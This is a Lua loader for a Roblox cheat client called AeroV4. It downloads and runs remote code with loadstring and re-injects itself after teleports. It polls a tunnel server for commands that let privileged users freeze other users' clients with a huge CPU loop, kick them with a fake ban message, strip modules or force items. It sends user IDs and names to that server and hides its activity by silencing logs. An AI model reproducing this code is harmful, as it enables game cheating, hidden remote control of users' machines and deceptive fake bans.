local j1l1jil1i=Path2DControlPoint.new(UDim2.new(0,0,0,0))
repeat task.wait() until game:IsLoaded()
if shared.vape then shared.vape:Uninject() end



if identifyexecutor then
	if table.find({'Wave', 'Seliware', 'Volt'}, ({identifyexecutor()})[1]) then
		getgenv().setthreadidentity = nil
	end
end

local args = ...
if type(args) == "table" and args.Username then
	shared.ValidatedUsername = args.Username
end

if type(args) == "table" and args.Closet then
	getgenv().Closet = true
else
	if getgenv().Closet == nil then
		getgenv().Closet = false
	end
end

local _realLoadstring = clonefunction(loadstring)
local vape
local loadstring = function(...)
	local res, err = _realLoadstring(...)
	if err and vape then
		vape:CreateNotification('AeroV4', 'Failed to load : '..err, 30, 'alert')
	end
	return res
end
do
	local _hookDetected = false
	pcall(function()
		local _testSrc = 'return 1'
		local _c1 = _realLoadstring(_testSrc)
		local _c2 = loadstring(_testSrc)
		if _c1 and _c2 then
			if debug and debug.info then
				local n1 = debug.info(_c1, 'n')
				local n2 = debug.info(_c2, 'n')
				if tostring(n1) ~= tostring(n2) then
					_hookDetected = true
				end
			end
		end
	end)
	if _hookDetected then
		game:GetService('Players').LocalPlayer:Kick('[AEROV4] integrity check failed - what u trying to do???')
		error('[AEROV4] loadstring hook detected - if this is false dm aero', 2)
	end
end
local queue_on_teleport = queue_on_teleport or function() end
local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
local cloneref = cloneref or function(obj)
	return obj
end
local playersService = cloneref(game:GetService('Players'))
local httpService = cloneref(game:GetService('HttpService'))

local function downloadFile(path, func)
	if not isfile(path) then
		local res
		local success = false
		for attempt = 1, 3 do
			local suc, result = pcall(function()
				return game:HttpGet('https://raw.githubusercontent.com/poopparty/poopparty/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
			end)
			if suc and result ~= '404: Not Found' then
				res = result
				success = true
				break
			end
			task.wait(1)
		end
		if not success then
			error('Failed to download ' .. path .. ' after 3 attempts')
		end
		if path:find('.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function migrateProfiles()
	if isfile('newvape/profiles/migrated_placeid.txt') then return end

    local oldId = tostring(game.GameId)
    local newId = tostring(game.PlaceId)

	if oldId == newId then
		pcall(writefile, 'newvape/profiles/migrated_placeid.txt', 'done')
		return
	end

	local suffix = oldId .. '.txt'
	for _, path in ipairs(listfiles('newvape/profiles')) do
		local name = path:gsub('\\', '/')
		if name:sub(-#suffix) == suffix then
			local newPath = name:sub(1, -#suffix - 1) .. newId .. '.txt'
			if not isfile(newPath) then
				pcall(function() writefile(newPath, readfile(path)) end)
			end
		end
	end

	if isfolder('newvape/profiles/premade') then
		for _, path in ipairs(listfiles('newvape/profiles/premade')) do
			local name = path:gsub('\\', '/')
			if name:sub(-#suffix) == suffix then
				local newPath = name:sub(1, -#suffix - 1) .. newId .. '.txt'
				if not isfile(newPath) then
					pcall(function() writefile(newPath, readfile(path)) end)
				end
			end
		end
	end

	pcall(writefile, 'newvape/profiles/migrated_placeid.txt', 'done')
end

pcall(migrateProfiles)

local function finishLoading()
	vape.Init = nil
	if not vape.Load then
		warn('[AEROV4] vape.Load is nil skipping load')
		return
	end
	vape:Load()
	vape:Clean(task.spawn(function()
		repeat
			pcall(vape.Save, vape)
			task.wait(10)
		until vape.Loaded == nil
	end))

	local teleportedServers
	vape:Clean(playersService.LocalPlayer.OnTeleport:Connect(function()
		if (not teleportedServers) and (not shared.VapeIndependent) then
			teleportedServers = true
			local teleportScript = [[
				loadstring(game:HttpGet('https://raw.githubusercontent.com/poopparty/poopparty/'..readfile('newvape/profiles/commit.txt')..'/loader.lua', true), 'loader')()
			]]
			if shared.VapeDeveloper then
				teleportScript = 'shared.VapeDeveloper = true\n' .. teleportScript
			end
			if shared.VapeCustomProfile then
				teleportScript = 'shared.VapeCustomProfile = "' .. shared.VapeCustomProfile .. '"\n' .. teleportScript
			end
			if shared.ValidatedUsername then
				teleportScript = 'shared.ValidatedUsername = "' .. shared.ValidatedUsername .. '"\n' .. teleportScript
			end
			local _ok, _err = pcall(function() vape:Save() end)
			if not _ok then warn('[AEROV4] save failed before teleport: ' .. tostring(_err)) toclipboard(_err) end
			queue_on_teleport(teleportScript)
		end
	end))

	if not shared.vapereload then
		if not vape.Categories then return end
		if vape.Categories.Main.Options['GUI bind indicator'].Enabled then
			local name = shared.ValidatedUsername and ('wsg, ' .. shared.ValidatedUsername .. ' :D ') or 'welcome '
			task.spawn(function()
				local deadline = tick() + 15
				while tick() < deadline do
					if getgenv()._aeroTierReady then break end
					task.wait(0.5)
				end
				local tier = 0
				if getgenv().getAeroTier then
					tier = getgenv().getAeroTier(playersService.LocalPlayer) or 0
				end
				if tier == 0 then
					task.wait(3)
					if getgenv().getAeroTier then
						tier = getgenv().getAeroTier(playersService.LocalPlayer) or 0
					end
				end
				
				vape:CreateNotification('[AEROV4] Finished Loading [Tier ' .. tostring(tier) .. ']', name .. (vape.VapeButton and 'Press the button in the top right to open GUI' or 'Press ' .. table.concat(vape.Keybind, ' + '):upper() .. ' to open GUI'), 5)
			end)
		end
	end
end

if not isfile('newvape/profiles/gui.txt') then
	writefile('newvape/profiles/gui.txt', 'new')
end
local gui = readfile('newvape/profiles/gui.txt')

if not isfolder('newvape/assets/' .. gui) then
	makefolder('newvape/assets/' .. gui)
end

local guiSource = downloadFile('newvape/guis/' .. gui .. '.lua')
local guiFunc, guiErr = _realLoadstring(guiSource, 'gui')
if not guiFunc then
	local errMsg = tostring(guiErr)
	local lineNum = errMsg:match(':(%d+):')
	local context = ''
	if lineNum then
		local n = tonumber(lineNum)
		local lines = guiSource:split('\n')
		local from = math.max(1, n - 2)
		local to   = math.min(#lines, n + 2)
		local parts = {}
		for i = from, to do
			local marker = i == n and '>>> ' or '    '
			table.insert(parts, marker .. i .. ': ' .. (lines[i] or ''))
		end
		context = '\n\nContext:\n' .. table.concat(parts, '\n')
	end
	error('[AEROV4] syntax error in ' .. gui .. '.lua' .. '\n' .. errMsg .. context)
end
vape = guiFunc()
if not vape then
	error('[AEROV4] GUI returned nil file may be corrupted try deleting newvape/guis/' .. gui .. '.lua and reinjecting.')
end
if not vape.Load then
	if delfile then pcall(function() delfile('newvape/guis/' .. gui .. '.lua') end) end
	error('[AEROV4] gui file corrupted (missing load) reinject..')
end
if not vape.Init and not vape.Load then
	error('[AEROV4] failed to initialize properly reinject to fix this bs')
end
shared.vape = vape
task.wait(0.1)

do
	local _req = (syn and syn.request) or (http_request and function(t) return http_request(t) end) or request or function() return {Body='{"tier":0}'} end
	local _liveUrl = 'https://purpose-documents-carbon-closed.trycloudflare.com/whitelist'
	local function _getUrl()
		return _liveUrl
	end
	local function _ft(uid)
	    local url = _getUrl()
	    if not url then
	        return 0
	    end
	
	    local ok, res = pcall(function()
	        return _req({
	            Url = url,
	            Method = 'POST',
	            Headers = {
	                ['Content-Type'] = 'application/json'
	            },
	            Body = httpService:JSONEncode({
	                action = 'check',
	                robloxUserId = tostring(uid),
	                roblox_id = tostring(uid)
	            })
	        })
	    end)
	
	    if not ok then
	        return 0
	    end
	
	    if not res or not res.Body then
	        return 0
	    end
	
	    local dok, data = pcall(function()
	        return httpService:JSONDecode(res.Body)
	    end)
	
		if not dok or not data then
			return 0
		end

		local t = tonumber(data.tier) or 0
		return t
	end

	local _tierCache = {}
	local _fetchQueue = {}
	local _queueRunning = false

	local function _queueFetch(uid)
		if _tierCache[uid] ~= nil and _tierCache[uid] ~= false then return end
		_tierCache[uid] = nil
		table.insert(_fetchQueue, uid)
		if _queueRunning then return end
		_queueRunning = true
		task.spawn(function()
			while #_fetchQueue > 0 do
				local id = table.remove(_fetchQueue, 1)
				_tierCache[id] = _ft(id)
				task.wait(0.2)
			end
			_queueRunning = false
		end)
	end

	local _commands = {}
	local lagConnections = {}
	local function _registerCommand(name, fn) _commands[name] = fn end

	getgenv()._aeroTierReady = false
	getgenv().getAeroTier = function(player) return 0 end

	task.spawn(function()
		local lplr = playersService.LocalPlayer
		_tierCache[lplr.UserId] = _ft(lplr.UserId)
		getgenv().getAeroTier = function(player)
			local t = _tierCache[player.UserId]
			return type(t) == 'number' and t or 0
		end
		getgenv()._aeroTierReady = true
		task.wait(1)
		for _, p in playersService:GetPlayers() do
			if p.UserId ~= lplr.UserId then _queueFetch(p.UserId) end
		end
	end)

	playersService.PlayerAdded:Connect(function(p) _queueFetch(p.UserId) end)

	local pollingActive = true
	vape:Clean(function() pollingActive = false end)
	task.spawn(function()
		local lplr = playersService.LocalPlayer
		local nextPoll = 0
		while pollingActive do
			if tick() < nextPoll then task.wait(0.5) continue end
			local url = _getUrl()
			if not url then nextPoll = tick() + 5 continue end
			local ok, res = pcall(function()
				return _req({
					Url = url,
					Method = 'POST',
					Headers = { ['Content-Type'] = 'application/json' },
					Body = httpService:JSONEncode({ action = 'getMessage', robloxUserId = tostring(lplr.UserId) })
				})
			end)
			if not ok or not res or not res.Body then nextPoll = tick() + 3 continue end
			local dok, data = pcall(function() return httpService:JSONDecode(res.Body) end)
			if not dok or not data then nextPoll = tick() + 3 continue end
			if res.StatusCode == 429 then nextPoll = tick() + ((data.retryAfter or 3000) / 1000) continue end
			if data.success and data.message then
				local fullMsg = tostring(data.message)
				local parts = fullMsg:split(' ')
				local twoWord = (parts[1] or '') .. ' ' .. (parts[2] or '')
				local cmd
				if _commands[twoWord] then
					cmd = twoWord
				else
					cmd = parts[1] or fullMsg
				end
				local args = data.args or fullMsg:sub(#cmd + 2)
				if _commands[cmd] then _commands[cmd](tostring(data.from), args) end
				pcall(function()
					_req({
						Url = url,
						Method = 'POST',
						Headers = { ['Content-Type'] = 'application/json' },
						Body = httpService:JSONEncode({ action = 'removeMessage', robloxUserId = tostring(lplr.UserId) })
					})
				end)
				nextPoll = tick() + 1.5
			else
				nextPoll = tick() + 3
			end
		end
	end)

	local function getAccountTier(player)
		if _tierCache[player.UserId] == nil then
			_queueFetch(player.UserId)
			return 0
		end
		local t = _tierCache[player.UserId]
		return type(t) == 'number' and t or 0
	end
	getgenv().getAccountTier = getAccountTier
	getgenv()._aerov4_getUrl = _getUrl
	getgenv()._aerov4_req = _req

	local function startLag(userId)
		local key = tostring(userId)
		if lagConnections[key] then return end
		local state = {active = true}
		local connection
		connection = game:GetService('RunService').Heartbeat:Connect(function()
			if not state.active then
				connection:Disconnect()
				lagConnections[key] = nil
				return
			end
			for i = 1, 10000000000 do local a = math.sin(i) * math.cos(i) end
		end)
		lagConnections[key] = {connection = connection, state = state}
	end

	local function stopLag(userId)
		local key = tostring(userId)
		local data = lagConnections[key]
		if not data then return end
		data.state.active = false
		data.connection:Disconnect()
		lagConnections[key] = nil
	end

	local function getTierByUserId(uid)
		local tier = _tierCache[uid]
		return type(tier) == 'number' and tier or 0
	end

	local function getLocalTier()
		local lplr = playersService.LocalPlayer
		return getTierByUserId(lplr.UserId)
	end

	_registerCommand('lag', function(from, args)
		if getLocalTier() >= 4 then return end
		startLag(from)
	end)

	_registerCommand('lagstop', function(from, args)
		if getLocalTier() >= 4 then return end
		stopLag(from)
	end)
	
	_registerCommand('ban', function(from, ...)
		if getLocalTier() >= 4 then return end
		if not from then return end
		local TextChatService = game:GetService("TextChatService")
		TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage("<font color='#ff0000'>A cheater in this server has been banned.</font>")
		game.Players.LocalPlayer:Kick(`You have been temporarily banned.\n[Remaining ban duration {math.random(4000,5000)} weeks {math.random(1,8)} days {math.random(1,5)} hours {math.random(1,60)} minutes {math.random(1,59)} seconds.]`)
		local msg = ''
		msg = string.gsub(game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text, "267", "600")
		game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text = msg
	end)

	_registerCommand('moduleremoved', function(from, args)
		if getLocalTier() >= 2 then return end
		print(from,args)
		if not args or args == '' then warn('no args') return end
		local parts = args:split(' ')
		local moduleName = parts[1]
		for _, mod in pairs(vape.Modules or {}) do
			if mod and mod.Name == moduleName then
				vape:Remove(moduleName)
			end
		end
	end)
	


	_registerCommand('sword', function(from, args)
		if getLocalTier() >= 2 then return end
		local target = args or lplr.Name
		local hand = workspace:WaitForChild(target):WaitForChild("HandInvItem")
		local inv = game:GetService("ReplicatedStorage"):FindFirstChild("Inventories"):FindFirstChild(target)
		local sword = nil
		local str = 'sword'
		for _, v in inv:GetChildren() do
			if v.Name:find(str) then
				sword = v
			end
		end	
		for _,v in pairs(getconnections(hand.Changed)) do
			v:Disable()
		end
		game:GetService("RunService").RenderStepped:Connect(function()
			if hand and hand.Parent then
				hand.Value = sword
			end
		end)
		hand.Value = sword
	end)

end

do
    local lplr = playersService.LocalPlayer
    local myTier = 0
    local lastReport = 0

    local function reportInjection(injected)
        task.spawn(function()
            local getUrl = getgenv()._aerov4_getUrl
            local req = getgenv()._aerov4_req
            if not getUrl or not req then return end

            local url = getUrl()
            if not url then return end

            pcall(function()
                req({
                    Url = url,
                    Method = 'POST',
                    Headers = {['Content-Type'] = 'application/json'},
                    Body = httpService:JSONEncode({
                        action = 'reportInjection',
                        robloxUserId = tostring(lplr.UserId),
                        username = lplr.Name,
                        tier = myTier,
                        injected = injected
                    })
                })
            end)
        end)
    end

    vape:Clean(function()
        reportInjection(false)
        task.wait(0.5)
    end)

    getgenv()._aeroInjectedUsers = getgenv()._aeroInjectedUsers or {}

    local pollingActive = true
    vape:Clean(function() pollingActive = false end)

    task.spawn(function()
        local start = tick()
        while tick() - start < 20 do
            if getgenv()._aeroTierReady then break end
            task.wait(0.3)
        end

        myTier = getgenv().getAeroTier and getgenv().getAeroTier(lplr) or 0
        reportInjection(true)
        lastReport = tick()
    end)

    task.spawn(function()
        while pollingActive do
            task.wait(25)
            if pollingActive and (tick() - lastReport > 20) then
                reportInjection(true)
                lastReport = tick()
            end
        end
    end)

    task.spawn(function()
        while pollingActive do
            task.wait(4)

            local getUrl = getgenv()._aerov4_getUrl
            local req = getgenv()._aerov4_req
            if not getUrl or not req then continue end

            local url = getUrl()
            if not url then continue end

            local success, response = pcall(function()
                return req({
                    Url = url,
                    Method = 'POST',
                    Headers = {['Content-Type'] = 'application/json'},
                    Body = httpService:JSONEncode({action = 'getInjectionStatus'})
                })
            end)

            if not success or not response or not response.Body then continue end

            local decodeSuccess, data = pcall(httpService.JSONDecode, httpService, response.Body)
            if not decodeSuccess or not data or not data.users then continue end

            local newMap = {}
            local localTier = getgenv().getAeroTier and getgenv().getAeroTier(lplr) or 0

            for _, u in ipairs(data.users) do
                local uid = tonumber(u.userId)
                if uid and uid ~= lplr.UserId then
                    local playerInServer = false
                    for _, p in ipairs(playersService:GetPlayers()) do
                        if p.UserId == uid then
                            playerInServer = true
                            break
                        end
                    end

                    if playerInServer then
                        local utier = u.tier or 0
                        local shouldShow = false

						if localTier == 99 then
							shouldShow = utier <= 4
						elseif localTier == 4 then
							shouldShow = utier <= 3
						else
							shouldShow = false
						end

                        if shouldShow then
                            newMap[uid] = {tier = utier, username = u.username or '?'}
                        end
                    end
                end
            end

            local prev = getgenv()._aeroInjectedUsers

            for uid, info in pairs(newMap) do
                if not prev[uid] then
                    vape:CreateNotification('[AEROV4] Injected', string.format('[T%d] %s injected', info.tier, info.username), 6)
                end
            end

            for uid, info in pairs(prev) do
                if not newMap[uid] then
                    vape:CreateNotification('[AEROV4] Uninjected', string.format('[T%d] %s uninjected', info.tier, info.username), 8)
                end
            end

            getgenv()._aeroInjectedUsers = newMap
        end
    end)
end

if getgenv().Closet then
	local LogService = cloneref(game:GetService('LogService'))
	local originals = {}
	local function hook(funcName)
		if typeof(getgenv()[funcName]) == 'function' then
			local original = hookfunction(getgenv()[funcName], function() end)
			originals[funcName] = original
		end
	end
	hook('print')
	hook('warn')
	hook('error')
	hook('info')
	pcall(function() LogService:ClearOutput() end)
	local conn = LogService.MessageOut:Connect(function()
		LogService:ClearOutput()
	end)
	getgenv()._vape_log_connection = conn
	getgenv()._vape_originals = originals
end

if not shared.VapeIndependent then
	_realLoadstring(downloadFile('newvape/games/universal.lua'), 'universal')()
	local gameFileId = (game.GameId == 2619619496) and (game.PlaceId == 6872265039 and 6872265039 or 6872274481) or game.PlaceId
	if isfile('newvape/games/' .. gameFileId .. '.lua') then
		_realLoadstring(downloadFile('newvape/games/' .. gameFileId .. '.lua'), tostring(gameFileId))(...)
	else
		if not shared.VapeDeveloper then
			local suc, res = pcall(function()
				return game:HttpGet('https://raw.githubusercontent.com/poopparty/poopparty/' .. readfile('newvape/profiles/commit.txt') .. '/games/' .. gameFileId .. '.lua', true)
			end)
			if suc and res ~= '404: Not Found' then
				_realLoadstring(downloadFile('newvape/games/' .. gameFileId .. '.lua'), tostring(gameFileId))(...)
			end
		end
	end
	finishLoading()
else
	vape.Init = finishLoading
	return vape
end
